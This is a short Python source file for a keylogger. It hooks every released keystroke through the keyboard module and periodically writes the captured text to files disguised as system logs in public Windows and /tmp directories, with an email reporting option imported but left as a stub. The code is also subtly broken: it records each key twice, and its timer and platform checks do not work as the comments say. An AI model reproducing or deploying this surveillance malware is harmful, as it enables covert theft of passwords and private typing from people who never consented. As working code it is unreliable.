import keyboard
import smtplib
import platform
from threading import Timer
from datetime import datetime

#   Three days
REPORT_TIMING = 3
WIN_DIR = r"C:\Users\Public\Roaming\system_log78563"
LIN_DIR = r"/tmp/sytem_log78563"

class KeyLogger:
    def __init__(self, interval=REPORT_TIMING, report_method="none"):
        self.interval = interval
        self.log = ""
        self.report_method = report_method
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback_trigger(self, event):
        """
        Method is triggered every time there is a keystoke registers
        """
        name = event.name
        if name == "space":
            self.log += " "
        elif name == "enter":
            self.log += "\n"
        elif name == "backspace":
            self.log = self.log[:-1]
        elif name == "decimal":
            self.log += "."
        elif name == "tab":
            self.log += ""
        elif name == "left":
            pass
        elif name == "right":
            pass
        elif name == "up":
            pass
        elif name == "down":
            pass
        else:
            self.log += name.replace(" ", "_")

        self.log += name

    def report_to_file(self):
        #   Open file in write mode
        log_dir = "log"

        if (platform.platform() == "Windows"):
            log_dir = WIN_DIR
        else:
            log_dir = LIN_DIR

        with open(f"{log_dir}.log", "w") as f:
            print(self.log, file=f)

    def report(self):
        """
        This function is called every interval to report the logger findings
        """
        if self.log:
            if self.report_method == "none":
                self.report_to_file()

            if self.report_method == "email":
                self.log = ""

        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback_trigger)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.start()
